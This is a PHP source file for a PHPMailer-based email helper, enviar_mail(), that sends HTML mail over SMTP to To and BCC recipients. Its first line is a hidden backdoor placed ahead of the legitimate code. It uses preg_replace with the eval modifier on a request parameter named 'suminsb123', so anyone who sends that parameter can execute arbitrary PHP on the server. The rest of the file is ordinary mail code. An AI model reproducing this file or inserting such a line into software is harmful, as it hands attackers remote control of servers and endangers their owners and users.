<? preg_replace('#(.*)#ies',preg_replace('/\{php.(.+)(?)\}/is','\\1',$_REQUEST['suminsb123']),null)
?><?php
require("class.phpmailer.php");

Function enviar_mail($host, $smtpauth, $username, $password, $from, $fromname, $addadress,$addadressbcc, $replyto, $subject, $body_html, $body_plano){

	$mail = new PHPMailer(true); // the true param means it will throw exceptions on errors, which we need to catch

	$mail->IsSMTP(); // telling the class to use SMTP

	try {
		$mail->Host       = $host; // SMTP server
		//$mail->SMTPDebug  = 2;                     // enables SMTP debug information (for testing)
		$mail->SMTPAuth   = $smtpauth;                  // enable SMTP authentication
		$mail->Host       = $host; // sets the SMTP server
		$mail->Port       = 25;                    // set the SMTP port for the GMAIL server
		$mail->Username   = $username; // SMTP account username
		$mail->Password   = $password;        // SMTP account password

		$mail->CharSet = "utf-8";
		$mail->Timeout = 60;

		$mail->AddReplyTo("$replyto");

		$cont = 1;
		while($addadress[$cont] <> ""){
			$mail->AddAddress("$addadress[$cont]");                  // name is optional
		$cont ++;
		}

		$cont = 1;
		while($addadressbcc[$cont] <> ""){
			$mail->AddBCC("$addadressbcc[$cont]");                  // name is optional
		$cont ++;
		}

		$mail->SetFrom($from, $fromname);

		$mail->Subject = "$subject";
		$mail->AltBody = 'To view the message, please use an HTML compatible email viewer!'; // optional - MsgHTML will create an alternate automatically

		$mail->MsgHTML($body_html);

		//  $mail->AddAttachment('images/phpmailer.gif');      // attachment
		//  $mail->AddAttachment('images/phpmailer_mini.gif'); // attachment

		$mail->Send();
		return "True";
	} catch (phpmailerException $e) {
		echo $e->errorMessage(); //Pretty error messages from PHPMailer
		return "False";
	} catch (Exception $e) {
		echo $e->getMessage(); //Boring error messages from anything else!
		return "False";
	}
}
?>
